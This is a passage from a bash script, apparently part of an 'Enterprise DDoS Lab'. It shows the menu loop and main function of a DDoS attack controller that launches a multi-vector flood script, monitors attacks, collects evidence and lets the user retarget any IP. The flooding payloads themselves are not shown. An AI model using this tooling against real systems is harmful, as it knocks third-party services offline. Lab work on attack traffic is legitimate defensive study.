                fi
                
                echo ""
                read -p "Press Enter to continue..."
                ;;
                
            7)
                echo ""
                read -p "Duration (seconds) [120]: " duration
                duration=${duration:-120}
                
                echo ""
                echo -e "${RED}⚠️  WARNING: This is a heavy multi-vector attack!${NC}"
                read -p "Start attack? (y/N): " confirm
                
                if [[ $confirm =~ ^[Yy]$ ]]; then
                    echo ""
                    echo -e "${YELLOW}[+] Starting Multi-Vector attack...${NC}"
                    "$ATTACKS_DIR/full_ddos_suite.sh" "$TARGET" "$duration"
                fi
                
                echo ""
                read -p "Press Enter to continue..."
                ;;
                
            8)
                echo ""
                start_attack_monitor "$TARGET"
                echo ""
                read -p "Press Enter to continue..."
                ;;
                
            9)
                stop_attack_monitor
                echo ""
                read -p "Press Enter to continue..."
                ;;
                
            10)
                cleanup_attacks
                echo ""
                read -p "Press Enter to continue..."
                ;;
                
            11)
                collect_attack_evidence
                echo ""
                read -p "Press Enter to continue..."
                ;;
                
            12)
                echo ""
                read -p "Enter new target IP: " new_target
                if [ ! -z "$new_target" ]; then
                    TARGET=$new_target
                    echo -e "${GREEN}[+] Target updated to: $TARGET${NC}"
                fi
                echo ""
                read -p "Press Enter to continue..."
                ;;
                
            13)
                cleanup_attacks
                echo ""
                echo -e "${GREEN}[+] Exiting Attack Controller...${NC}"
                echo -e "${GREEN}[+] Thank you for using Enterprise DDoS Lab${NC}"
                exit 0
                ;;
                
            *)
                echo "Invalid choice"
                sleep 1
                ;;
        esac
    done
}

# Main execution
main() {
    log_attack "INFO" "DDoS Attack Controller started"
    log_attack "INFO" "Attacker: $(hostname)"
    log_attack "INFO" "IP: $(hostname -I | cut -d' ' -f1)"
    
    # Check and install tools
    check_tools
    install_python_deps
    
    # Create attack scripts
    create_attack_scripts
    
    # Show initial target check
    echo ""
    check_target "$TARGET"
    echo ""
    read -p "Press Enter to continue to main menu..."
    
    # Show menu
    show_menu
}

# Run main function
main "$@"
